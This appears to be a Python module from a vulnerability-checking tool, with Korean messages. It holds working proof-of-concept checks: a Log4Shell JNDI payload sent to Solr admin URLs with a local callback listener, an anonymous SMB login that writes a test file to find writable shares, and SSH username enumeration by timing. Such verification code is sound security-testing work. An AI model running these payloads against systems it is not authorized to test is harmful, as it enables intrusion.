import io
import socket
import threading
import time
import urllib.request
import urllib.parse

from .utils import console, ok, warn, step, free_port


def poc_log4shell(target):
    cb_port = free_port()
    if not cb_port:
        warn("취약점 검증: 사용 가능한 포트 없음")
        return False, "포트 확보 실패"

    received = threading.Event()

    def _listen():
        try:
            with socket.socket() as srv:
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                srv.bind(('0.0.0.0', cb_port))
                srv.listen(5)
                srv.settimeout(8)
                try:
                    conn, _ = srv.accept()
                    received.set()
                    conn.close()
                except socket.timeout:
                    pass
        except Exception:
            pass

    threading.Thread(target=_listen, daemon=True).start()
    time.sleep(0.4)

    payload = f"${{jndi:ldap://host.docker.internal:{cb_port}/x}}"
    step(f"JNDI 페이로드 전송 중 (포트 {cb_port})")
    time.sleep(0.2)

    encoded = urllib.parse.quote(payload)
    urls = [
        f"{target}/solr/admin/cores?action={encoded}",
        f"{target}/solr/admin/info/system?wt={encoded}",
    ]
    for url in urls:
        try:
            urllib.request.urlopen(
                urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}),
                timeout=4
            )
        except Exception:
            pass
        if received.is_set():
            break

    step("연결 요청 대기 중 (최대 8초)...")
    for _ in range(16):
        if received.is_set():
            break
        time.sleep(0.5)

    if received.is_set():
        ok(f"위험 요소 감지: JNDI 연결 요청 수신 (포트 {cb_port})")
        return True, f"JNDI 연결 요청 감지됨 (포트 {cb_port})  원격 코드 실행 위험"
    else:
        warn("연결 요청 미감지")
        return False, "검증 미완료"


def poc_sambacry(host, port):
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        warn("impacket 미설치  pip install impacket")
        return False, "impacket 미설치"

    step("SMB 익명 로그인 시도 중...")
    time.sleep(0.2)

    try:
        smb = SMBConnection('*SMBSERVER', host, sess_port=port, timeout=8)
        smb.login('', '')
        ok("익명 로그인 성공")

        step("공유 목록 열거 중...")
        time.sleep(0.3)
        shares = smb.listShares()

        names = []
        for s in shares:
            raw = s['shi1_netname']
            try:
                name = raw.decode('utf-16-le').rstrip('\x00') if isinstance(raw, bytes) else str(raw).rstrip('\x00')
            except Exception:
                name = str(raw)
            names.append(name)
        ok(f"공유 목록: {', '.join(names)}")

        step("쓰기 가능한 공유 탐색 중...")
        time.sleep(0.3)

        for name in names:
            if name.upper() in ('IPC$', 'PRINT$'):
                continue
            try:
                buf = io.BytesIO(b"poc_test")
                smb.putFile(name, 'poc_wr.txt', buf.read)
                try:
                    smb.deleteFile(name, 'poc_wr.txt')
                except Exception:
                    pass
                smb.logoff()
                ok(f"위험 요소 감지: '{name}' 공유에 쓰기 권한 있음")
                return True, f"쓰기 권한 확인됨 (공유: {name})  악성 파일 업로드 가능성 있음"
            except Exception:
                continue

        smb.logoff()
        warn("쓰기 가능한 공유 없음")
        return False, "쓰기 가능 공유 없음"

    except Exception as e:
        warn(f"검증 실패: {e}")
        return False, str(e)[:80]


def poc_ssh_enum(host, port):
    try:
        import logging
        import paramiko
        logging.getLogger("paramiko").setLevel(logging.CRITICAL)
    except ImportError:
        warn("paramiko 미설치  pip install paramiko")
        return False, "paramiko 미설치"

    step("RSA 키 생성 중...")
    time.sleep(0.2)
    try:
        key = paramiko.RSAKey.generate(1024)
    except Exception:
        warn("키 생성 실패")
        return False, "키 생성 실패"

    def auth_attempt(username):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            t = paramiko.Transport(sock)
            t.start_client(timeout=5)
            start = time.perf_counter()
            try:
                t.auth_publickey(username, key)
                return "accepted", time.perf_counter() - start
            except paramiko.AuthenticationException:
                return "rejected", time.perf_counter() - start
            except Exception:
                return "error", time.perf_counter() - start
            finally:
                try:
                    t.close()
                except Exception:
                    pass
        except Exception:
            return "connect_fail", 0.0

    users = [("root", True), ("nonexistent_usr_xq9z", False)]
    results = {}

    for username, _ in users:
        step(f"계정 '{username}' 인증 응답 측정 중...")
        status, elapsed = auth_attempt(username)
        results[username] = (status, elapsed)
        ok(f"      응답: {status}  ({elapsed * 1000:.0f}ms)")
        time.sleep(0.3)

    root_status, root_time = results["root"]
    fake_status, fake_time = results["nonexistent_usr_xq9z"]

    if root_status == "rejected" and fake_status != "rejected":
        ok("위험 요소 감지: 유효 계정과 무효 계정의 응답 패턴이 다름")
        return True, "계정 존재 여부 노출  유효 계정과 무효 계정의 인증 응답이 구별됨"
    elif root_status == "rejected":
        diff = root_time - fake_time
        msg = f"유효({root_time * 1000:.0f}ms)  무효({fake_time * 1000:.0f}ms)  차이 {diff * 1000:.0f}ms"
        ok(f"위험 요소 감지: 응답 시간 차이로 계정 정보 노출 가능  {msg}")
        return True, f"타이밍 기반 계정 정보 노출  {msg}"
    else:
        warn(f"예상치 못한 응답 ({root_status})")
        return False, "응답 분석 실패"
